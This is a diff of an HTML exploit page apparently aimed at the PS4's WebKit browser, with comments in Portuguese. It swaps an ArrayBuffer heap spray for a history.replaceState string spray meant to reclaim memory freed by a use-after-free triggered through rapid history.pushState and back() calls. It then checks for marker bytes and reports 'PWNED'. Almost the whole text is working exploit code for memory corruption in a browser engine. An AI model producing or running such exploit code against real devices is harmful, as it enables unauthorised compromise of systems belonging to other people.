@@ -2,24 +2,27 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 WebKit - ArrayBuffer Reclaim (340KB)</title>
+<title>PS4 WebKit - Native History Spray</title>
 <style>
-    body { background-color: #000; color: #00ff00; font-family: monospace; padding: 20px; }
+    body { background-color: #000; color: #fff; font-family: monospace; padding: 20px; }
     button { 
         padding: 20px; width: 100%; margin-bottom: 10px;
         font-weight: bold; font-size: 16px; cursor: pointer; 
-        border: 2px solid #0f0; background: #004400; color: #fff;
+        border: 2px solid #fff; background: #333; color: #fff;
         text-transform: uppercase;
     }
+    .btn-8 { border-color: #0f0; color: #0f0; }
+    .btn-16 { border-color: #f0f; color: #f0f; }
     #log { border: 1px solid #555; margin-top: 20px; padding: 10px; white-space: pre-wrap; height: 350px; overflow-y: scroll;}
-    .success { color: #fff; background-color: #008800; padding: 5px; font-weight: bold;}
 </style>
 </head>
 <body>
-<h2>PS4 WebKit - ArrayBuffer Reclaim (340KB Target)</h2>
-<div id="status">Estratégia: Raw Buffer (psfree style)</div>
+<h2>PS4 WebKit - Native History Reclaim</h2>
+<div id="status">Aguardando...</div>
 
-<button onclick="runBufferExploit()">INICIAR RECLAIM (340KB)</button>
+<button class="btn-8" onclick="runHistorySpray(340356)">MODO 1: 8-BIT (~340KB Chars)</button>
+
+<button class="btn-16" onclick="runHistorySpray(170178)">MODO 2: 16-BIT (~170KB Chars)</button>
 
 <div id="log"></div>
 
@@ -28,31 +31,35 @@ const logEl = document.getElementById("log");
 const statusEl = document.getElementById("status");
 function log(m, type="") { 
     const d = document.createElement("div");
-    if(type) d.className = type;
     d.textContent = m;
     logEl.appendChild(d);
     logEl.scrollTop = logEl.scrollHeight;
 }
 function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
 
-var keepAlive = [];
-
-async function runBufferExploit() {
+async function runHistorySpray(targetChars) {
     logEl.innerHTML = "";
-    keepAlive = []; 
-    statusEl.innerText = "Rodando...";
+    statusEl.innerText = "Preparando...";
 
-    // === CONFIGURAÇÃO BASEADA NO SEU DIAGNÓSTICO ===
-    // Buraco confirmado: 340.356 bytes.
-    // Estratégia: Usar ArrayBuffer puro (sem conversão de string).
-    const TARGET_SIZE = 340356;
+    // 1. GERAÇÃO DE PAYLOADS
+    // Vamos gerar variações ao redor do tamanho alvo para compensar headers.
+    // Usamos history.replaceState, então precisamos de strings reais.
+    log(`1. Gerando payloads ao redor de ${targetChars} chars...`);
     
-    log("1. Disparando UAF Original...");
+    let payloads = [];
+    // Variação generosa de +/- 128 bytes
+    for(let delta = -128; delta <= 128; delta += 4) {
+        let len = targetChars + delta;
+        // Prefixo 'W' para ser visível
+        payloads.push("W".repeat(len));
+    }
+    
+    // 2. TRIGGER UAF
+    log("2. Disparando UAF...");
     
     let size = 977;
     const STEP = 14461;
 
-    // Loop do UAF Intacto
     for(let i = 0; i < 48; i++) {
         let frag = "V".repeat(size); 
         history.pushState({}, "", "#" + frag);
@@ -60,49 +67,27 @@ async function runBufferExploit() {
         
         if(i % 6 === 0) setTimeout(() => history.back(), 0);
         
-        // Na última volta, fazemos o spray IMEDIATAMENTE após o back() ser agendado
+        // NA JANELA CRÍTICA:
         if (i === 47) {
-             log(">>> SPRAY ARRAYBUFFER (340KB +/- variação) <<<");
-             // Executa spray síncrono para tentar pegar a memória no ato
-             doBufferSpray(TARGET_SIZE);
+            log(">>> INJETANDO VIA HISTORY API <<<");
+            // Spray Síncrono usando a própria API do histórico
+            // Isso deve usar o mesmo alocador (IsoHeap)
+            for(let p of payloads) {
+                // replaceState aloca uma nova string de URL e libera a antiga.
+                // Estamos tentando fazer uma dessas novas cair no buraco da antiga.
+                // O terceiro argumento é a URL.
+                history.replaceState({}, "", "#" + p);
+            }
         } else {
-             size += STEP;
-             await sleep(5);
+            size += STEP;
+            await sleep(5);
         }
     }
     
     await sleep(200);
 
-    // === VERIFICAÇÃO ===
+    // 3. VERIFICAÇÃO
     checkResult();
-}
-
-function doBufferSpray(targetSize) {
-    // Tenta cobrir a diferença de headers entre StringImpl e ArrayBufferContents
-    // Varia o tamanho de -128 a +128 bytes
-    for(let delta = -128; delta <= 128; delta += 8) {
-        try {
-            let trySize = targetSize + delta;
-            
-            // Técnica do psfree.mjs: Uint8Array sobre ArrayBuffer
-            let buf = new ArrayBuffer(trySize);
-            let view = new Uint8Array(buf);
-            
-            // Preenche o início e o fim com marcadores 'A' (0x41)
-            // Não preenchemos tudo para ser rápido (O(1))
-            view[0] = 0x41;
-            view[1] = 0x41;
-            view[2] = 0x41;
-            view[3] = 0x41;
-            
-            // Preenche o meio (onde a URL provavelmente lê)
-            let mid = Math.floor(trySize / 2);
-            view[mid] = 0x41;
-            view[mid+1] = 0x41;
-            
-            keepAlive.push(view);
-        } catch(e) {}
-    }
 }
 
 function checkResult() {
@@ -111,23 +96,26 @@ function checkResult() {
     let changed = false;
     let sample = "";
     
-    // Procura por 'A' (0x41)
+    // Procura por 'W'
     for(let i=1000; i<5000; i++) {
-        if(url.charCodeAt(i) === 0x41) { 
+        if(url.charCodeAt(i) === 0x57) { // 0x57 é 'W'
             changed = true;
-            sample = "Encontrado 'AAAA' no offset " + i;
+            sample = "Encontrado 'W' no offset " + i;
             break;
         }
     }
 
     if(changed) {
         log("!!! JACKPOT !!!", "success");
-        log("ArrayBuffer ocupou a memória!");
+        log("Native History Spray funcionou!");
         log(sample);
         statusEl.innerText = "PWNED";
+        statusEl.style.backgroundColor = "#fff";
+        statusEl.style.color = "#000";
     } else {
         log("Falha: Ainda vendo 'V'.");
-        log("Tamanho do buffer testado: ~" + 340356 + " bytes");
+        log("URL Length Atual: " + url.length);
+        log("Nota: Se falhar, o IsoHeap pode estar usando 'Slabs' que não reutilizam imediatamente.");
     }
 }
 </script>
